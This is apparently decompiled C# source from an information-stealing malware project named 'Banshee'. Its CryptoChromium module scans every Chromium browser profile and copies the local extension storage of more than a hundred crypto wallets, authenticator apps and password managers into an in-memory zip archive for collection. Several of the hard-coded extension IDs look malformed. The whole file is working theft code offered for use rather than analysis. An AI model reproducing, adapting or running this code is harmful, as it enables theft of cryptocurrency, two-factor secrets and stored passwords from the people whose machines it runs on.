﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using Banshee.Helper;
using Banshee.Helper.Data;

namespace Banshee.Targets.Browsers
{
	// Token: 0x0200007C RID: 124
	public class CryptoChromium : ITarget
	{
		// Token: 0x06000177 RID: 375 RVA: 0x0000BDB8 File Offset: 0x0000BDB8
		public void Collect(InMemoryZip zip, Counter counter)
		{
			Parallel.ForEach<string>(Paths.Chromium, delegate(string browser)
			{
				if (!Directory.Exists(browser))
				{
					return;
				}
				Parallel.ForEach<string>(Directory.GetDirectories(browser), delegate(string profile)
				{
					string browserName = Paths.GetBrowserName(browser);
					string fileName = Path.GetFileName(profile);
					this.GetChromeWallets(zip, counter, profile, fileName, browserName);
				});
			});
		}

		// Token: 0x06000178 RID: 376 RVA: 0x0000BDF8 File Offset: 0x0000BDF8
		private void GetChromeWallets(InMemoryZip zip, Counter counter, string profilePath, string profilename, string browserName)
		{
			string path = Path.Combine(profilePath, "Local Extension Settings");
			if (!Directory.Exists(path))
			{
				return;
			}
			Dictionary<string, string> extensionDirs = Directory.EnumerateDirectories(path).ToDictionary((string dir) => Path.GetFileName(dir).ToLowerInvariant(), (string dir) => dir);
			List<string> collected = new List<string>();
			List<string> failed = new List<string>();
			Parallel.ForEach<string[]>(this.ChromeWalletsDirectories, delegate(string[] walletInfo)
			{
				string key = walletInfo[1];
				string text;
				if (!extensionDirs.TryGetValue(key, out text))
				{
					return;
				}
				string fileName = Path.GetFileName(text);
				string text2 = ZipPath.Wallets(Path.Combine(browserName, profilename, walletInfo[0], fileName ?? walletInfo[1]));
				string[] files;
				List<string> obj;
				try
				{
					files = Directory.GetFiles(text, "*", SearchOption.AllDirectories);
				}
				catch (Exception ex)
				{
					obj = failed;
					lock (obj)
					{
						failed.Add(walletInfo[0] + " (reason: " + ex.Message + ")");
					}
					return;
				}
				int num = files.Length;
				int num2 = 0;
				int num3 = 0;
				string text3 = null;
				foreach (string text4 in files)
				{
					string path2 = text4.Substring(text.Length).TrimStart(new char[]
					{
						Path.DirectorySeparatorChar,
						Path.AltDirectorySeparatorChar
					});
					string entryPath = Path.Combine(text2, path2).Replace('\\', '/');
					byte[] content;
					string text5;
					if (CryptoChromium.TryReadFileWithShare(text4, out content, out text5))
					{
						zip.AddFile(entryPath, content);
						num2++;
					}
					else
					{
						text3 = text5;
						num3++;
					}
				}
				counter.CryptoChromium.Add(text + " => " + text2);
				if (num2 > 0)
				{
					obj = collected;
					lock (obj)
					{
						string text6 = (num3 > 0 && !string.IsNullOrEmpty(text3)) ? string.Format(", failed {0} file(s), last error: {1}", num3, text3) : string.Empty;
						collected.Add(string.Format("{0} ({1}/{2}{3}) => {4}", new object[]
						{
							walletInfo[0],
							num2,
							num,
							text6,
							text2
						}));
						return;
					}
				}
				string arg = (num == 0) ? "no files found" : (text3 ?? "copy failed");
				obj = failed;
				lock (obj)
				{
					failed.Add(string.Format("{0} (0/{1} files, reason: {2})", walletInfo[0], num, arg));
				}
			});
			if (collected.Count == 0 && failed.Count == 0)
			{
				return;
			}
			if (collected.Count > 0)
			{
				DebugLogger.Log(string.Format("[{0}:{1}] CryptoChromium: collected {2} wallet(s): {3}", new object[]
				{
					browserName,
					profilename,
					collected.Count,
					string.Join(", ", collected)
				}));
			}
			if (failed.Count > 0)
			{
				DebugLogger.Log(string.Format("[{0}:{1}] CryptoChromium: failed to collect {2} wallet(s): {3}", new object[]
				{
					browserName,
					profilename,
					failed.Count,
					string.Join(", ", failed)
				}));
			}
		}

		// Token: 0x06000179 RID: 377 RVA: 0x0000BF8C File Offset: 0x0000BF8C
		private static bool TryReadFileWithShare(string file, out byte[] content, out string error)
		{
			content = null;
			error = null;
			try
			{
				content = File.ReadAllBytes(file);
				return true;
			}
			catch (IOException)
			{
			}
			catch (Exception ex)
			{
				error = ex.Message;
				return false;
			}
			bool result;
			try
			{
				using (FileStream fileStream = File.Open(file, FileMode.Open, FileAccess.Read, FileShare.Read | FileShare.Write | FileShare.Delete))
				{
					using (MemoryStream memoryStream = new MemoryStream())
					{
						fileStream.CopyTo(memoryStream);
						content = memoryStream.ToArray();
						result = true;
					}
				}
			}
			catch (Exception ex2)
			{
				error = ex2.Message;
				result = false;
			}
			return result;
		}

		// Token: 0x04000139 RID: 313
		private readonly List<string[]> ChromeWalletsDirectories = new List<string[]>
		{
			new string[]
			{
				"Trust Wallets",
				"pknlccmneadmjbkollckpblgaaabameg"
			},
			new string[]
			{
				"MetaWallet",
				"pfknkoocfefiocadajpngdknmkjgakdg"
			},
			new string[]
			{
				"Guarda Wallet",
				"fcglfhcjfpkgdppjbglknafgfffkelnm"
			},
			new string[]
			{
				"Exodus",
				"idkppnahnmmggbmfkjhiakkbkdpnmnon"
			},
			new string[]
			{
				"JaxxxLiberty",
				"mhonjhhcgphdphdjcdoeodfdliikapmj"
			},
			new string[]
			{
				"Backpack Crypto",
				"aflkmfhebedbjioipglgcbcmnbpgliof"
			},
			new string[]
			{
				"Bitget Wallet",
				"jiidiaalihmmhddjgbnbgdfflelocpak"
			},
			new string[]
			{
				"Petra Aptos",
				"ejjladinnckdgjemekebdpeokbikhfci"
			},
			new string[]
			{
				"Rainbow Wallet",
				"opfgelmcmbiajamepnmloijbpoleiama"
			},
			new string[]
			{
				"Ready Wallet",
				"dlcobpjiigpikoobohmabehhmhfoodbb"
			},
			new string[]
			{
				"Solflare",
				"bhhhlbepdkbapadjdnnojkbgioiodbic"
			},
			new string[]
			{
				"Temple Wallet",
				"ookjlbkiijinhpmnjffcofjonbfbgaoc"
			},
			new string[]
			{
				"Venom Wallet",
				"ojggmchlghnjlapmfbnjholfjkiidbch"
			},
			new string[]
			{
				"Xverse Wallet",
				"idnnbdplmphpflfnlkomgpfbpcgelopg"
			},
			new string[]
			{
				"Atomic Wallet",
				"bhmlbgebokamljgnceonbncdofmmkedg"
			},
			new string[]
			{
				"Mycelium",
				"pidhddgciaponoajdngciiemcflpnnbg"
			},
			new string[]
			{
				"Coinomi",
				"blbpgcogcoohhngdjafgpoagcilicpjh"
			},
			new string[]
			{
				"GreenAddress",
				"gflpckpfdgcagnbdfafmibcmkadnlhpj"
			},
			new string[]
			{
				"Edge",
				"doljkehcfhidippihgakcihcmnknlphh"
			},
			new string[]
			{
				"BRD",
				"nbokbjkelpmlgflobbohapifnnenbjlh"
			},
			new string[]
			{
				"Samourai Wallet",
				"apjdnokplgcjkejimjdfjnhmjlbpgkdi"
			},
			new string[]
			{
				"Copay",
				"ieedgmmkpkbiblijbbldefkomatsuahh"
			},
			new string[]
			{
				"Bread",
				"jifanbgejlbcmhbbdbnfbfnlmbomjedj"
			},
			new string[]
			{
				"KeepKey",
				"dojmlmceifkfgkgeejemfciibjehhdcl"
			},
			new string[]
			{
				"Trezor",
				"jpxupxjxheguvfyhfhahqvxvyqthiryh"
			},
			new string[]
			{
				"Ledger Live",
				"pfkcfdjnlfjcmkjnhcbfhfkkoflnhjln"
			},
			new string[]
			{
				"Ledger Wallet",
				"hbpfjlflhnmkddbjdchbbifhllgmmhnm"
			},
			new string[]
			{
				"Bitbox",
				"ocmfilhakdbncmojmlbagpkjfbmeinbd"
			},
			new string[]
			{
				"Digital Bitbox",
				"dbhklojmlkgmpihhdooibnmidfpeaing"
			},
			new string[]
			{
				"YubiKey",
				"mammpjaaoinfelloncbbpomjcihbkmmc"
			},
			new string[]
			{
				"Nifty Wallet",
				"jbdaocneiiinmjbjlgalhcelgbejmnid"
			},
			new string[]
			{
				"Math Wallet",
				"afbcbjpbpfadlkmhmclhkeeodmamcflc"
			},
			new string[]
			{
				"Coinbase Wallet",
				"hnfanknocfeofbddgcijnmhnfnkdnaad"
			},
			new string[]
			{
				"Equal Wallet",
				"blnieiiffboillknjnepogjhkgnoac"
			},
			new string[]
			{
				"EVER Wallet",
				"cgeeodpfagjceefieflmdfphplkenlfk"
			},
			new string[]
			{
				"Jaxx Liberty",
				"ocefimbphcgjaahbclemolcmkeanoagc"
			},
			new string[]
			{
				"BitApp Wallet",
				"fihkakfobkmkjojpchpfgcmhfjnmnfpi"
			},
			new string[]
			{
				"Mew CX",
				"nlbmnnijcnlegkjjpcfjclmcfggfefdm"
			},
			new string[]
			{
				"GU Wallet",
				"nfinomegcaccbhchhgflladpfbajihdf"
			},
			new string[]
			{
				"Guild Wallet",
				"nanjmdkhkinifnkgdeggcnhdaammmj"
			},
			new string[]
			{
				"Saturn Wallet",
				"nkddgncdjgifcddamgcmfnlhccnimig"
			},
			new string[]
			{
				"Harmony Wallet",
				"fnnegphlobjdpkhecapkijjdkgcjhkib"
			},
			new string[]
			{
				"TON Wallet",
				"nphplpgoakhhjchkkhmiggakijnkhfnd"
			},
			new string[]
			{
				"OpenMask Wallet",
				"penjlddjkjgpnkllboccdgccekpkcbin"
			},
			new string[]
			{
				"MyTonWallet",
				"fldfpgipfncgndfolcbkdeeknbbbnhcc"
			},
			new string[]
			{
				"DeWallet",
				"pnccjgokhbnggghddhahcnaopgeipafg"
			},
			new string[]
			{
				"TrustWallet",
				"egjidjbpglichdcondbcbdnbeeppgdph"
			},
			new string[]
			{
				"NC Wallet",
				"imlcamfeniaidioeflifonfjeeppblda"
			},
			new string[]
			{
				"Moso Wallet",
				"ajkifnllfhikkjbjopkhmjoieikeihjb"
			},
			new string[]
			{
				"Enkrypt Wallet",
				"kkpllkodjeloidieedojogacfhpaihoh"
			},
			new string[]
			{
				"CirusWeb3 Wallet",
				"kgdijkcfiglijhaglibaidbipiejjfdp"
			},
			new string[]
			{
				"Martian and Sui Wallet",
				"efbglgofoippbgcjepnhiblaibcnclgk"
			},
			new string[]
			{
				"SubWallet",
				"onhogfjeacnfoofkfgppdlbmlmnplgbn"
			},
			new string[]
			{
				"Pontem Wallet",
				"phkbamefinggmakgklpkljjmgibohnba"
			},
			new string[]
			{
				"Talisman Wallet",
				"fijngjgcjhjmmpcmkeiomlglpeiijkld"
			},
			new string[]
			{
				"Kardiachain Wallet",
				"pdadjkfkgcafgbceimcpbkalnfnepbnk"
			},
			new string[]
			{
				"Phantom Wallet",
				"bfnaelmomeimhipmgjnjophhpkkoljpa"
			},
			new string[]
			{
				"Phantom Wallet",
				"bfnaelmomeimhlpmgjnjophhpkkoljpa"
			},
			new string[]
			{
				"Oxygen Wallet",
				"fhilaheimglignddjgofkcbgekhenbh"
			},
			new string[]
			{
				"PaliWallet",
				"mgfffbidihjpoaomajlbgchddlicgpn"
			},
			new string[]
			{
				"BoltX Wallet",
				"aodkkagnadcbobfpggnjeongemjbjca"
			},
			new string[]
			{
				"Liquality Wallet",
				"kpopkelmapcoipemfendmdghnegimn"
			},
			new string[]
			{
				"xDefi Wallet",
				"hmeobnffcmdkdcmlb1gagmfpfboieaf"
			},
			new string[]
			{
				"Nami Wallet",
				"ipfcbjknijpeeillifnkikgncikgfhdo"
			},
			new string[]
			{
				"MaiarDeFi Wallet",
				"dngmlblcodfobpdpecaadgfbeggfjfnm"
			},
			new string[]
			{
				"MetaMask Wallet",
				"nkbihfbeogaeaoehlefnkodbefgpgknn"
			},
			new string[]
			{
				"MetaMask Wallet",
				"djclckkglechooblngghdinmeemkbgci"
			},
			new string[]
			{
				"MetaMask Wallet",
				"ejbalbakoplchlghecdalmeeeajnimhm"
			},
			new string[]
			{
				"Goblin Wallet",
				"mlbafbjadjidk1bhgopoamemfibcpdfi"
			},
			new string[]
			{
				"Braavos Smart Wallet",
				"jnlgamecbpmbajjfhmmmlhejkemejdma"
			},
			new string[]
			{
				"UniSat Wallet",
				"ppbibelpcjmhbdihakflkdcoccbgbkpo"
			},
			new string[]
			{
				"OKX Wallet",
				"mcohilncbfahbmgdjkbpemcciiolgcge"
			},
			new string[]
			{
				"Manta Wallet",
				"enabgbdfcbaehmbigakijjabdpdnimlg"
			},
			new string[]
			{
				"Suku Wallet",
				"fopmedgnkfpebgllppeddmmochcookhc"
			},
			new string[]
			{
				"Suiet Wallet",
				"khpkpbbcccdmmclmpigdgddabeilkdpd"
			},
			new string[]
			{
				"Koala Wallet",
				"lnnnmfcpbkafcpgdilckhmhbkkbpkmid"
			},
			new string[]
			{
				"ExodusWeb3 Wallet",
				"aholpfdialjgjfhomihkjbmgjidlcdno"
			},
			new string[]
			{
				"Aurox Wallet",
				"kilnpioakcdndlodeeceffgjdpojajlo"
			},
			new string[]
			{
				"Fewcha Move Wallet",
				"ebfidpplhabeedpnhjnobghokpiioolj"
			},
			new string[]
			{
				"Carax Demon Wallet",
				"mdjmfdffdcmnoblignmgpommbefadffd"
			},
			new string[]
			{
				"Leap Terra Wallet",
				"aijcbedoijmgnlmjeegjaglmepbmpkpi"
			},
			new string[]
			{
				"Keplr Wallet",
				"dmkamcknogkgcdfhhbddcghachkejeap"
			},
			new string[]
			{
				"Binance Chain Wallet",
				"fhbohimaelbohpjbbldcngcnapndodjp"
			},
			new string[]
			{
				"Yoroi Wallet",
				"ffnbelfdoeiohenkjibnmadjiehjhajb"
			},
			new string[]
			{
				"Rabby Wallet",
				"acmacodkjbdgmoleebolmdjonilkdbch"
			},
			new string[]
			{
				"TokenPocket",
				"mfgccjchihfkkindfppnaooecgfneiii"
			},
			new string[]
			{
				"SafePal Extension Wallet",
				"lgmpcpglpngdoalbgeoldeajfclnhafa"
			},
			new string[]
			{
				"Magic Eden Wallet",
				"mkpegjkblkkefacfnmkajcjmabijhclg"
			},
			new string[]
			{
				"Ronin",
				"fnjhmkhhmkbjkkabndcnnogagogbneec"
			},
			new string[]
			{
				"Coin98",
				"aeachknmefphepccionboohckonoeemg"
			},
			new string[]
			{
				"TerraStation",
				"aiifbnbfobpmeekipheeijimdpnlpgpp"
			},
			new string[]
			{
				"Wombat",
				"amkmjjmmflddogmhpjloimipbofnfjih"
			},
			new string[]
			{
				"Nami",
				"lpfcbjknijpeeillifnkikgncikgfhdo"
			},
			new string[]
			{
				"XDEFI",
				"hmeobnfnfcmdkdcmlblgagmfpfboieaf"
			},
			new string[]
			{
				"Tronlink",
				"ibnejdfjmmkpcnlpebklmnkoeoihofec"
			},
			new string[]
			{
				"Authenticator",
				"bhghoamapcdpbohphigoooaddinpkbai"
			},
			new string[]
			{
				"Google Authenticator",
				"khcodhlfkpmhibicdjjblnkgimdepgnd"
			},
			new string[]
			{
				"Microsoft Authenticator",
				"bfbdnbpibgndpjfhonkflpkijfapmomn"
			},
			new string[]
			{
				"Authy",
				"gjffdbjndmcafeoehgdldobgjmlepcal"
			},
			new string[]
			{
				"Duo Mobile",
				"eidlicjlkaiefdbgmdepmmicpbggmhoj"
			},
			new string[]
			{
				"OTP Auth",
				"bobfejfdlhnabgglompioclndjejolch"
			},
			new string[]
			{
				"FreeOTP",
				"elokfmmmjbadpgdjmgglocapdckdcpkn"
			},
			new string[]
			{
				"Aegis Authenticator",
				"ppdjlkfkedmidmclhakfncpfdmdgmjpm"
			},
			new string[]
			{
				"LastPass Authenticator",
				"cfoajccjibkjhbdjnpkbananbejpkkjb"
			},
			new string[]
			{
				"Dashlane",
				"flikjlpgnpcjdienoojmgliechmmheek"
			},
			new string[]
			{
				"Keeper",
				"gofhklgdnbnpcdigdgkgfobhhghjmmkj"
			},
			new string[]
			{
				"RoboForm",
				"hppmchachflomkejbhofobganapojjol"
			},
			new string[]
			{
				"KeePass",
				"lbfeahdfdkibininjgejjgpdafeopflb"
			},
			new string[]
			{
				"KeePassXC",
				"kgeohlebpjgcfiidfhhdlnnkhefajmca"
			},
			new string[]
			{
				"Bitwarden",
				"inljaljiffkdgmlndjkdiepghpolcpki"
			},
			new string[]
			{
				"NordPass",
				"njgnlkhcjgmjfnfahdmfkalpjcneebpl"
			},
			new string[]
			{
				"LastPass",
				"gabedfkgnbglfbnplfpjddgfnbibkmbb"
			}
		};
	}
}
